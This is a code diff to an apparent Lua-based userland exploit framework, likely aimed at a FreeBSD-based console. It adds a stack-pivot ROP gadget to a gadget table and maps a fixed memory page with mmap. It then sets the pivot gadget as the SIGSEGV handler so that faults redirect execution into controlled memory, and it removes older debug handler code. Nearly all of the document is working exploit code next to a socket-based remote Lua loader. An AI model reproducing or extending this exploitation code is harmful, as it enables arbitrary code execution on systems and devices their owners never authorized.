@@ -89,6 +89,7 @@ gadget_table = {
             ["pop rsi; ret"] = 0x10ef32,
             ["pop r8; ret"] = 0x9f1,
             ["mov r9, rbx; call [rax + 8]"] = 0x1511ff,
+            ["mov esp, 0xfb0000bd; ret"] = 0x3bca94,
 
             ["mov [rdi], rsi; ret"] = 0xd76ff,
             ["mov [rdi], rax; ret"] = 0x994cb,
@@ -1982,9 +1983,6 @@ function remote_lua_loader(port)
 
     local maxsize = 500 * 1024  -- 500kb
     local buf = bump.alloc(maxsize)
-    
-    -- sleep(5)
-    -- memory.write_qword(0x41414141, 0x4242)
 
     local sock_fd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
     if sock_fd < 0 then
@@ -2114,26 +2112,32 @@ function get_version()
 end
 
 function sigaction(signum, action, old_action)
+    MAP_PRIVATE = 0x2
+    MAP_FIXED = 0x10
+    MAP_ANONYMOUS = 0x1000
+    MAP_COMBINED = bit32.bor(MAP_PRIVATE, MAP_FIXED, MAP_ANONYMOUS)
+    
+    PROT_READ = 0x1
+    PROT_WRITE = 0x2
+    PROT_COMBINED = bit32.bor(PROT_READ, PROT_WRITE)
+    
+    if syscall.mmap(0xfb000000, 0x1000, PROT_COMBINED, MAP_COMBINED, -1 ,0):tonumber() < 0 then
+        error("mmap() error: " .. get_error_string())
+    end
+    
     if syscall.sigaction(signum, action, old_action):tonumber() < 0 then
-        errorf("failed to set signal handler")
+        error("sigaction() error: " .. get_error_string())
     end
 
     return true
 end
 
-function handle(signum)
-    print("!!!!!!!!!!!!handling!!!\n")
-end
-
 function signal_handler()
     local SIGSEGV = 11
     print("Setting signal handler\n")
-    print("Handler function address:\n")
-    print(lua.addrof_trivial(handle))
+    local sigaction_struct = bump.alloc(0x8)
     
-    local sigaction_struct = bump.alloc(0xa0)
-    memory.write_qword(sigaction_struct, lua.addrof_trivial(handle))
-    -- memory.write_qword(sigaction_struct, 0x0000414300004445)
+    memory.write_qword(sigaction_struct, gadgets["mov esp, 0xfb0000bd; ret"]) -- sigaction.sa_handler
     
     sigaction(SIGSEGV, sigaction_struct, 0)
 end
@@ -2168,6 +2172,7 @@ function main()
         listen = 106,
         sysctl = 202,
         sigaction = 416,
+        mmap = 477,
     })
 
     -- sanity check
